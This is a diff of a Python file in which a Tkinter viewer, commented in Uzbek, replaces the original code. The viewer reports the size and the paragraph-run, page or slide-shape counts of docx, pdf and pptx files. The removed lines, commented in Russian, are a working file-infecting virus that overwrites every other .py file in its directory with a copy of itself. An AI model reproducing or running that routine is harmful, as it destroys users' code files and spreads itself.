@@ -1,26 +1,78 @@
 import os
-import shutil
+import docx
+from PyPDF2 import PdfReader
+from pptx import Presentation
+import tkinter as tk
+from tkinter import filedialog
 
-# Функция, которая копирует сам себя в другие файлы в той же директории
-def infect():
-    # Получаем список всех файлов в текущей директории
-    files = os.listdir()
+root = tk.Tk()
 
-    # Отфильтровываем только исполняемые файлы на Python (с расширением .py)
-    python_files = [file for file in files if file.endswith('.py')]
+def aniqlash(file_name): 
+    try:
+        # Faylni hajmini aniqlash qismi
+        fayl_hajmi = os.path.getsize(file_name)
+        result.insert(tk.END, f"Fayl yo'li: {file_name}")
+        file_size(file_name)
+    # FileNotFoundError xatolik chiqsa
+    except FileNotFoundError:
+        result.insert(tk.END, f"{file_name} fayli topilmadi.\n")
 
-    # Цикл для копирования вируса в другие файлы
-    for file in python_files:
-        # Исключаем текущий исполняемый файл
-        if file != os.path.basename(__file__):
-            try:
-                shutil.copy(__file__, file)
-                print(f"Файл {file} заражен!")
-            except Exception as e:
-                print(f"Не удалось заразить файл {file}: {str(e)}")
+def file_size(file_name):
+    fayl_hajmi = os.path.getsize(file_name)
+    result1.insert(tk.END, f"Fayl hajmi: {fayl_hajmi} bayt\n")
+    # Fayllarni qanday fayl turini bilish qismi
+    if file_name.lower().endswith(('.docx', '.doc')):
+        doc = docx.Document(file_name)
+        qatorlar_soni = sum(len(paragraphs.runs) for paragraphs in doc.paragraphs)
+        result1.insert(tk.END, f"Qator: {qatorlar_soni} qator mavjud.\n")
 
-# Запуск вируса
-if __name__ == "__main__":
-    infect()
-    print("Вирус активирован!")
+    # Fayllarni qanday fayl turini bilish qismi
+    elif file_name.lower().endswith('.pdf'):
+        with open(file_name, 'rb') as f:
+            pdf_reader = PdfReader(f)
+            qatorlar_soni = len(pdf_reader.pages)
+            result1.insert(tk.END, f"Qator: {qatorlar_soni} qator mavjud.\n")
 
+    # Fayllarni qanday fayl turini bilish qismi
+    elif file_name.lower().endswith('.pptx'):
+        prs = Presentation(file_name)
+        qatorlar_soni = sum(len(slide.shapes) for slide in prs.slides)
+        result1.insert(tk.END, f"Qator: {qatorlar_soni} qator mavjud.\n")
+
+    # Fayl mos kelmasa
+    else:
+        result1.insert(tk.END, f"Faylning turi tanilanmadi.\n")
+
+def file_choose():
+    file_path = filedialog.askopenfilename()
+    if file_path:
+        result.delete(1.0, tk.END)  # Eski natijalarni tozalash
+        result1.delete(1.0, tk.END)
+        aniqlash(file_path)
+
+# Tkinter asosiy oyna
+root.title("Fayl ma'lumotlarini ko'rish dasturi")
+browse_button = tk.Button(root, text="Faylni ko'rib chiqish", command=file_choose, bg='green', fg='white')
+browse_button.pack(pady=10)
+
+paned_window = tk.PanedWindow(root, orient=tk.HORIZONTAL)
+paned_window.pack(fill=tk.BOTH, expand=True)
+
+result = tk.Text(paned_window, height=15, width=40, bg='blue', fg='white')
+result.pack(padx=10)
+paned_window.add(result)
+
+result1 = tk.Text(paned_window, height=15, width=40, bg='yellow', fg='black')
+result1.pack(padx=10)
+paned_window.add(result1)
+
+button_frame = tk.Frame(root)
+button_frame.pack(side=tk.RIGHT, fill=tk.X)
+
+btn_quit = tk.Button(button_frame, text='Chiqish', command=root.destroy, bg='red', fg='white')
+btn_quit.pack(side=tk.LEFT, padx=10, pady=5)
+
+btn_scan = tk.Button(button_frame, text='Skaner qilish', command=aniqlash, bg='blue', fg='white')
+btn_scan.pack(side=tk.LEFT, padx=10, pady=5)
+
+root.mainloop()
